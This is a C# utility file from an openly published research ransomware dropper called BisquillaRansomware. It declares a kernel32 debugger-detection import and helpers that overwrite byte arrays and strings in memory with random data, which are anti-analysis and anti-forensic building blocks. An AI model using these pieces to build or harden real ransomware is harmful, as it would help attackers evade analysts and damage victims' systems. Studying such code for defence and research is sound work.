/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using System;
using System.Runtime.InteropServices;

namespace BisquillaRansomwareDropper
{
    /// <summary>
    /// Common Stufs
    /// </summary>
    public sealed class Common
    {
        private Common() { }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        /// <summary>
        /// Global Randomizer
        /// </summary>
        public static readonly Random random = new Random();

        /// <summary>
        /// Clear Array Content from Memory
        /// </summary>
        /// <param name="array"></param>
        public static void ClearArray(ref byte[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)random.Next(0, 255);
            }
        }

        /// <summary>
        /// Clear String Content from Memory
        /// </summary>
        /// <param name="array"></param>
        public static unsafe void ClearString(ref string str)
        {
            if (str == null) { return; }

            int strLen = str.Length;

            fixed (char* ptr = str)
            {
                for (int i = 0; i < strLen; i++)
                {
                    ptr[i] = (char)random.Next(0, 255);
                }
            }
        }
    }
}
